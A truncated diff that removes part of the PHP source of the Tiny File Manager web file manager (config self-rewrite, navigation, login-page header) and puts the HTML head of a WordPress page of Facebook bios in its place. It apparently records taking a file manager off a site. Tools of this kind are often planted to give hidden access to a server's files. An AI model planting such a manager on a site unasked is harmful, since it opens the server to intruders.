-                        if (!$this->addDir($path . '/' . $file)) {
-                            return false;
-                        }
-                    } elseif (is_file($path . '/' . $file)) {
-                        try {
-                            $this->tar->addFile($path . '/' . $file);
-                        } catch (Exception $e) {
-                            return false;
-                        }
-                    }
-                }
-            }
-            return true;
-        }
-        return false;
-    }
-}
-
-/**
- * Save Configuration
- */
- class FM_Config
-{
-     var $data;
-
-    function __construct()
-    {
-        global $root_path, $root_url, $CONFIG;
-        $fm_url = $root_url.$_SERVER["PHP_SELF"];
-        $this->data = array(
-            'lang' => 'en',
-            'error_reporting' => true,
-            'show_hidden' => true
-        );
-        $data = false;
-        if (strlen($CONFIG)) {
-            $data = fm_object_to_array(json_decode($CONFIG));
-        } else {
-            $msg = 'Tiny File Manager<br>Error: Cannot load configuration';
-            if (substr($fm_url, -1) == '/') {
-                $fm_url = rtrim($fm_url, '/');
-                $msg .= '<br>';
-                $msg .= '<br>Seems like you have a trailing slash on the URL.';
-                $msg .= '<br>Try this link: <a href="' . $fm_url . '">' . $fm_url . '</a>';
-            }
-            die($msg);
-        }
-        if (is_array($data) && count($data)) $this->data = $data;
-        else $this->save();
-    }
-
-    function save()
-    {
-        $fm_file = __FILE__;
-        $var_name = '$CONFIG';
-        $var_value = var_export(json_encode($this->data), true);
-        $config_string = "<?php" . chr(13) . chr(10) . "//Default Configuration".chr(13) . chr(10)."$var_name = $var_value;" . chr(13) . chr(10);
-        if (is_writable($fm_file)) {
-            $lines = file($fm_file);
-            if ($fh = @fopen($fm_file, "w")) {
-                @fputs($fh, $config_string, strlen($config_string));
-                for ($x = 3; $x < count($lines); $x++) {
-                    @fputs($fh, $lines[$x], strlen($lines[$x]));
-                }
-                @fclose($fh);
-            }
-        }
-    }
-}
-
-//--- Templates Functions ---
-
-/**
- * Show nav block
- * @param string $path
- */
-function fm_show_nav_path($path)
-{
-    global $lang, $sticky_navbar, $editFile;
-    $isStickyNavBar = $sticky_navbar ? 'fixed-top' : '';
-    $getTheme = fm_get_theme();
-    $getTheme .= " navbar-light";
-    if(FM_THEME == "dark") {
-        $getTheme .= " navbar-dark";
-    } else {
-        $getTheme .= " bg-white";
-    }
-    ?>
-    <nav class="navbar navbar-expand-lg <?php echo $getTheme; ?> mb-4 main-nav <?php echo $isStickyNavBar ?>">
-        <a class="navbar-brand"> <?php echo lng('AppTitle') ?> </a>
-        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-            <span class="navbar-toggler-icon"></span>
-        </button>
-        <div class="collapse navbar-collapse" id="navbarSupportedContent">
-
-            <?php
-            $path = fm_clean_path($path);
-            $root_url = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
-            $sep = '<i class="bread-crumb"> / </i>';
-            if ($path != '') {
-                $exploded = explode('/', $path);
-                $count = count($exploded);
-                $array = array();
-                $parent = '';
-                for ($i = 0; $i < $count; $i++) {
-                    $parent = trim($parent . '/' . $exploded[$i], '/');
-                    $parent_enc = urlencode($parent);
-                    $array[] = "<a href='?p={$parent_enc}'>" . fm_enc(fm_convert_win($exploded[$i])) . "</a>";
-                }
-                $root_url .= $sep . implode($sep, $array);
-            }
-            echo '<div class="col-xs-6 col-sm-5">' . $root_url . $editFile . '</div>';
-            ?>
-
-            <div class="col-xs-6 col-sm-7">
-                <ul class="navbar-nav justify-content-end <?php echo fm_get_theme();  ?>">
-                    <li class="nav-item mr-2">
-                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
-                            <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon">
-                            <div class="input-group-append">
-                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
-                            </div>
-                            <div class="input-group-append btn-group">
-                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
-                                  <div class="dropdown-menu dropdown-menu-right">
-                                    <a class="dropdown-item" href="<?php echo $path2 = $path ? $path : '.'; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php echo lng('Advanced Search') ?></a>
-                                  </div>
-                            </div>
-                        </div>
-                    </li>
-                    <?php if (!FM_READONLY): ?>
-                    <li class="nav-item">
-                        <a title="<?php echo lng('Upload') ?>" class="nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php echo lng('Upload') ?></a>
-                    </li>
-                    <li class="nav-item">
-                        <a title="<?php echo lng('NewItem') ?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php echo lng('NewItem') ?></a>
-                    </li>
-                    <?php endif; ?>
-                    <?php if (FM_USE_AUTH): ?>
-                    <li class="nav-item avatar dropdown">
-                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php if(isset($_SESSION[FM_SESSION_ID]['logged'])) { echo $_SESSION[FM_SESSION_ID]['logged']; } ?></a>
-                        <div class="dropdown-menu text-small shadow <?php echo fm_get_theme(); ?>" aria-labelledby="navbarDropdownMenuLink-5">
-                            <?php if (!FM_READONLY): ?>
-                            <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
-                            <?php endif ?>
-                            <a title="<?php echo lng('Help') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php echo lng('Help') ?></a>
-                            <a title="<?php echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php echo lng('Logout') ?></a>
-                        </div>
-                    </li>
-                    <?php else: ?>
-                        <?php if (!FM_READONLY): ?>
-                            <li class="nav-item">
-                                <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
-                            </li>
-                        <?php endif; ?>
-                    <?php endif; ?>
-                </ul>
-            </div>
-        </div>
-    </nav>
-    <?php
-}
-
-/**
- * Show alert message from session
- */
-function fm_show_message()
-{
-    if (isset($_SESSION[FM_SESSION_ID]['message'])) {
-        $class = isset($_SESSION[FM_SESSION_ID]['status']) ? $_SESSION[FM_SESSION_ID]['status'] : 'ok';
-        echo '<p class="message ' . $class . '">' . $_SESSION[FM_SESSION_ID]['message'] . '</p>';
-        unset($_SESSION[FM_SESSION_ID]['message']);
-        unset($_SESSION[FM_SESSION_ID]['status']);
-    }
-}
-
-/**
- * Show page header in Login Form
- */
-function fm_show_header_login()
-{
-$sprites_ver = '20160315';
-header("Content-Type: text/html; charset=utf-8");
-header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
-header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
-header("Pragma: no-cache");
-
-global $lang, $root_url, $favicon_path;
-?>
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="en-US" prefix="og: https://ogp.me/ns#" class="no-js" itemtype="https://schema.org/Blog" itemscope>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
-    <meta name="author" content="CCP Programmers">
-    <meta name="robots" content="noindex, nofollow">
-    <meta name="googlebot" content="noindex">
-    <?php if($favicon_path) { echo '<link rel="icon" href="'.fm_enc($favicon_path).'" type="image/png">'; } ?>
-    <title><?php echo fm_enc(APP_TITLE) ?></title>
-    <?php print_external('pre-jsdelivr'); ?>
-    <?php print_external('css-bootstrap'); ?>
-    <style>
-        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
-        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
-        .fm-login-page .brand img{ width:100%}
-        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
-        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
-        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
-        .fm-login-page .form-control{ border-width:2.3px}
-        .fm-login-page .form-group label{ width:100%}
-        .fm-login-page .btn.btn-block{ padding:12px 10px}
-        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
-        @media screen and (max-width:425px){
-            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
-        }
-        @media screen and (max-width:320px){
-            .fm-login-page .card.fat{ padding:0}
-            .fm-login-page .card.fat .card-body{ padding:15px}
-        }
-        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
-        .message.ok{ border-color:green;color:green}
-        .message.error{ border-color:red;color:red}
-        .message.alert{ border-color:orange;color:orange}
-        body.fm-login-page.theme-dark {background-color: #2f2a2a;}
-        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
-    </style>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+	
+<!-- Search Engine Optimization by Rank Math - https://rankmath.com/ -->
+<title>Latest 800+ Facebook Stylish Bio for Girls and Boys 2024</title>
+<meta name="description" content="Friends, vist this post to get a special collection of facebook stylish bio that will make your profile more stylish and professional."/>
+<meta name="robots" content="follow, index, max-snippet:-1, max-video-preview:-1, max-image-preview:large"/>
+<link rel="canonical" href="https://socialfunda.net/latest-facebook-stylish-bio/" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Latest 800+ Facebook Stylish Bio for Girls and Boys 2024" />
+<meta property="og:description" content="Friends, vist this post to get a special collection of facebook stylish bio that will make your profile more stylish and professional." />
+<meta property="og:url" content="https://socialfunda.net/latest-facebook-stylish-bio/" />
+<meta property="og:site_name" content="Socialfunda.in" />
+<meta property="article:publisher" content="https://www.facebook.com/socialfundda" />
+<meta property="article:section" content="Facebook Bios" />
+<meta property="og:updated_time" content="2024-02-13T14:04:32+00:00" />
+<meta property="og:image" content="https://socialfunda.net/wp-content/uploads/2023/02/Facebook-stylish-bio.webp" />
+<meta property="og:image:secure_url" content="https://socialfunda.net/wp-content/uploads/2023/02/Facebook-stylish-bio.webp" />
+<meta property="og:image:width" content="1920" />
+<meta property="og:image:height" content="1080" />
+<meta property="og:image:alt" content="facebook stylish bio" />
+<meta property="og:image:type" content="image/webp" />
+<meta property="article:published_time" content="2023-02-13T14:23:01+00:00" />
+<meta property="article:modified_time" content="2024-02-13T14:04:32+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Latest 800+ Facebook Stylish Bio for Girls and Boys 2024" />
+<meta name="twitter:description" content="Friends, vist this post to get a special collection of facebook stylish bio that will make your profile more stylish and professional." />
+<meta name="twitter:site" content="@@SocialFundda" />
+<meta name="twitter:creator" content="@@SocialFundda" />
+<meta name="twitter:image" content="https://socialfunda.net/wp-content/uploads/2023/02/Facebook-stylish-bio.webp" />
+<meta name="twitter:label1" content="Written by" />
+<meta name="twitter:data1" content="Socialfunda" />
+<meta name="twitter:label2" content="Time to read" />
+<meta name="twitter:data2" content="6 minutes" />
+<script type="application/ld+json" class="rank-math-schema">{"@context":"https://schema.org","@graph":[{"@type":["Person","Organization"],"@id":"https://socialfunda.net/#person","name":"Socialfunda","sameAs":["https://www.facebook.com/socialfundda","https://twitter.com/@SocialFundda"],"logo":{"@type":"ImageObject","@id":"https://socialfunda.net/#logo","url":"https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp","contentUrl":"https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp","caption":"Socialfunda.in","inLanguage":"en-US","width":"319","height":"116"},"image":{"@type":"ImageObject","@id":"https://socialfunda.net/#logo","url":"https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp","contentUrl":"https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp","caption":"Socialfunda.in","inLanguage":"en-US","width":"319","height":"116"}},{"@type":"WebSite","@id":"https://socialfunda.net/#website","url":"https://socialfunda.net","name":"Socialfunda.in","publisher":{"@id":"https://socialfunda.net/#person"},"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://socialfunda.net/wp-content/uploads/2023/02/Facebook-stylish-bio.webp","url":"https://socialfunda.net/wp-content/uploads/2023/02/Facebook-stylish-bio.webp","width":"1920","height":"1080","inLanguage":"en-US"},{"@type":"WebPage","@id":"https://socialfunda.net/latest-facebook-stylish-bio/#webpage","url":"https://socialfunda.net/latest-facebook-stylish-bio/","name":"Latest 800+ Facebook Stylish Bio for Girls and Boys 2024","datePublished":"2023-02-13T14:23:01+00:00","dateModified":"2024-02-13T14:04:32+00:00","isPartOf":{"@id":"https://socialfunda.net/#website"},"primaryImageOfPage":{"@id":"https://socialfunda.net/wp-content/uploads/2023/02/Facebook-stylish-bio.webp"},"inLanguage":"en-US"},{"@type":"Person","@id":"https://socialfunda.net/latest-facebook-stylish-bio/#author","name":"Socialfunda","image":{"@type":"ImageObject","@id":"https://secure.gravatar.com/avatar/2d61ed2a044702321a55dd16ad12e9485e7ff4b62930125329b58ddd9b90c405?s=96&amp;d=mm&amp;r=g","url":"https://secure.gravatar.com/avatar/2d61ed2a044702321a55dd16ad12e9485e7ff4b62930125329b58ddd9b90c405?s=96&amp;d=mm&amp;r=g","caption":"Socialfunda","inLanguage":"en-US"},"sameAs":["https://socialfunda.net"]},{"@type":"BlogPosting","headline":"Latest 800+ Facebook Stylish Bio for Girls and Boys 2024","keywords":"facebook stylish bio","datePublished":"2023-02-13T14:23:01+00:00","dateModified":"2024-02-13T14:04:32+00:00","author":{"@id":"https://socialfunda.net/latest-facebook-stylish-bio/#author","name":"Socialfunda"},"publisher":{"@id":"https://socialfunda.net/#person"},"description":"Friends, vist this post to get a special collection of facebook stylish bio that will make your profile more stylish and professional.","name":"Latest 800+ Facebook Stylish Bio for Girls and Boys 2024","@id":"https://socialfunda.net/latest-facebook-stylish-bio/#richSnippet","isPartOf":{"@id":"https://socialfunda.net/latest-facebook-stylish-bio/#webpage"},"image":{"@id":"https://socialfunda.net/wp-content/uploads/2023/02/Facebook-stylish-bio.webp"},"inLanguage":"en-US","mainEntityOfPage":{"@id":"https://socialfunda.net/latest-facebook-stylish-bio/#webpage"}}]}</script>
+<!-- /Rank Math WordPress SEO plugin -->
+
+<link rel='dns-prefetch' href='//www.googletagmanager.com' />
+<link rel="alternate" type="application/rss+xml" title="Social Funda &raquo; Feed" href="https://socialfunda.net/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Social Funda &raquo; Comments Feed" href="https://socialfunda.net/comments/feed/" />
+			<script>document.documentElement.classList.remove( 'no-js' );</script>
+			<link rel="alternate" type="application/rss+xml" title="Social Funda &raquo; Latest 800+ Facebook Stylish Bio for Girls and Boys 2024 Comments Feed" href="https://socialfunda.net/latest-facebook-stylish-bio/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://socialfunda.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsocialfunda.net%2Flatest-facebook-stylish-bio%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://socialfunda.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsocialfunda.net%2Flatest-facebook-stylish-bio%2F&#038;format=xml" />
+<style id='wp-img-auto-sizes-contain-inline-css'>
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+
+<link rel='stylesheet' id='kadence-blocks-infobox-css' href='https://socialfunda.net/wp-content/plugins/kadence-blocks/dist/style-blocks-infobox.css?ver=3.6.5' media='all' />
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://socialfunda.net/wp-includes/css/dist/block-library/style.min.css?ver=6.9.4' media='all' />
+
+<style id='wp-block-image-inline-css'>
+.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:#5a5a5a40;border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;width:20px;z-index:100}@media not (prefers-reduced-motion){.wp-lightbox-container button{transition:opacity .2s ease}}.wp-lightbox-container button:focus-visible{outline:3px auto #5a5a5a40;outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:#5a5a5a40;border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100%;z-index:100000}.wp-lightbox-overlay .close-button{align-items:center;cursor:pointer;display:flex;justify-content:center;min-height:40px;min-width:40px;padding:0;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .close-button:focus,.wp-lightbox-overlay .close-button:hover,.wp-lightbox-overlay .close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay 